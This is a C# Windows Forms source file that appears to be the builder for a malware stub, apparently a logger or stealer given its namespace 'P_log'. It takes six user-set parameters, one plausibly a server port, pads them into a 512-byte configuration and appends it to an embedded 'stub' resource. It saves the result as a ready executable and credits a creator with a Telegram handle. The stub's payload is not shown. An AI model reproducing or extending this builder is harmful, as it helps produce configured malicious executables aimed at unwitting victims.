using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace P_log
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text.Length !=0 && textBox2.Text.Length !=0 && textBox3.Text.Length !=0 && textBox4.Text.Length !=0 &&  numericUpDown1.Value.ToString().Length !=1 &&  numericUpDown2.Value.ToString().Length !=1  )
            {
                string Char = ",";
                string Config = textBox1.Text + Char + numericUpDown1.Value.ToString() + Char + textBox2.Text + Char + textBox3.Text + Char + textBox4.Text + Char + numericUpDown2.Value.ToString();
                byte[] ConfigByte = Encoding.UTF8.GetBytes(Config);
                byte[] Trim = new Byte[512 - ConfigByte.Length];
                ConfigByte = Combine(ConfigByte, Trim);
                byte[] Stub = (Properties.Resources.stub);
                Stub = Combine(Stub, ConfigByte);
                try
                {
                    SaveFileDialog Save = new SaveFileDialog();
                    Save.Filter = "Excutable|*.exe|All files|*.*";
                    Save.ShowDialog();
                    System.IO.File.WriteAllBytes(Save.FileName.ToString(), Stub);
                    System.IO.FileInfo File = new System.IO.FileInfo(Save.FileName.ToString());
                    MessageBox.Show("The \""+File.Name.ToString() + "\" Build Succeeded !", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception)
                { }
            }
            else
            {
                MessageBox.Show("Please enter the parameters correctly !", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
          

        }
        private static byte[] Combine(byte[] a123, byte[] b123)
        {
            byte[] c123 = new byte[a123.Length + b123.Length];
            Buffer.BlockCopy(a123, 0, c123, 0, a123.Length);
            Buffer.BlockCopy(b123, 0, c123, a123.Length, b123.Length);
            return c123;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Creator : Shadow | Telegram : @ParsingTeam");
        }

        private void numericUpDown2_ValueChanged(object sender, EventArgs e)
        {
            if (numericUpDown2.Value > 10000000000)
            {
                numericUpDown2.Value = 10000000000;
            }
        }
    }
}
